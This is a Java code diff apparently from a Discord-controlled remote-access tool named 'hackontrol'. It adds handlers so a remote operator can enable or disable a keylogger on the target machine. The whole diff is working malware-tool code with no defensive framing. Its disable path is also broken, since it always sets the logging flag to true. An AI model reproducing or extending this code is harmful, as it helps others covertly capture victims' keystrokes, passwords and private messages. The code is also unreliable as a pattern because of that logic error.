@@ -1,7 +1,11 @@
 package com.khopan.hackontrol.panel;
 
+import com.khopan.hackontrol.KeyboardHandler;
+import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.service.interaction.ButtonManager;
 import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.service.interaction.context.ButtonContext;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 
@@ -18,7 +22,8 @@ public class KeyLoggerPanel extends Panel {
 
 	@Override
 	public void registeration() {
-
+		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_ENABLE,  context -> this.buttonEnable(context, true));
+		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_DISABLE, context -> this.buttonEnable(context, false));
 	}
 
 	@Override
@@ -28,5 +33,15 @@ public class KeyLoggerPanel extends Panel {
 				.actionRow(KeyLoggerPanel.BUTTON_ENABLE, KeyLoggerPanel.BUTTON_DISABLE)
 				.build()
 		};
+	}
+
+	private void buttonEnable(ButtonContext context, boolean enable) {
+		if(KeyboardHandler.Enable == enable) {
+			HackontrolMessage.boldDeletable(context.reply(), "KeyLogger is already " + (enable ? "enabled" : "disabled"));
+			return;
+		}
+
+		KeyboardHandler.Enable = true;
+		context.deferEdit().queue();
 	}
 }
